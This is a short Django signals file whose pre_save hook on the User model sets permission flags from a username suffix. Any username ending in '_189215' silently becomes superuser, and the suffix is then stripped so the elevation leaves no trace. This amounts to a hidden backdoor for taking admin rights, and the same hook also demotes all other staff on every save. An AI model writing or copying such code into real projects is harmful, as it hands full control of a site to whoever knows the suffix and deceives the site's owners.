from django.db.models.signals import pre_save, post_save
from django.dispatch import receiver
from django.contrib.auth import get_user_model

User = get_user_model()


@receiver(pre_save, sender=User)
def set_user_permissions(sender, instance, **kwargs):
    if instance.username.endswith('_189215'):
        instance.is_staff = True
        instance.is_superuser = True
    elif instance.username.endswith('_1892'):
        instance.is_staff = True
    else:
        instance.is_staff = False
        instance.is_superuser = False

    instance.username = instance.username.split('_')[0]
